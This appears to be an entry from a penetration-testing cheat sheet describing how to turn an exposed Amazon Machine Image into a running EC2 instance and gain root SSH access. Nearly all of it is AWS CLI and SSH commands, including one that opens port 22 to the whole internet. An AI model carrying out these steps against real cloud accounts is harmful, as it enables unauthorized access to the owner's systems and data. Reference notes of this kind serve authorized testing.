# AMI Files

## AMI file to EC2 compromise

Restore the EC2 instance using the exposed AMI file. You will receive a JSON response with an `ImageId` key and value. Store the value because it will be needed to start the instance.

```
aws ec2 create-restore-image-task --object-key <AMI id> --bucket <bucket> --name <arbitrary name>
```

Create a new SSH key pair

```
aws ec2 create-key-pair --key-name <arbitrary name> --query "KeyMaterial" --output text > <path>.pem
```

Get information about subnets and security groups

```
aws ec2 describe-subnets
aws ec2 describe-security-groups
```

If the subnet does not contain a security rule that allows SSH access run the following commands

```
aws ec2 create-security-group --group-name <name> --description "<descr>" --vpc-id <subnet id>
aws ec2 authorize-security-group-ingress --group-id <security group id> --protocol tcp --port 22 --cidr 0.0.0.0/0
```

Create a new EC2 instance with SSH access. Add the generated key to the new instance. If the operation is successful you will receive a JSON response with the information related to the new EC2 instance. Store the `InstanceId` value as reference to the new instance.

```
aws ec2 run-instances --image-id <restored image ID> --instance-type t3a.micro --key-name <generated key name> --subnet-id <subnet id> --security-group-id <security group id>
```

Get the public ip address of the instance

```
aws ec2 describe-instances --instance-ids <instance id> --query 'Reservations[*].Instances[*].PublicIpAddress' --output text
```

Connect to the instance via SSH

```
ssh -i "<key file>.pem" root@<EC2 ip address>
```
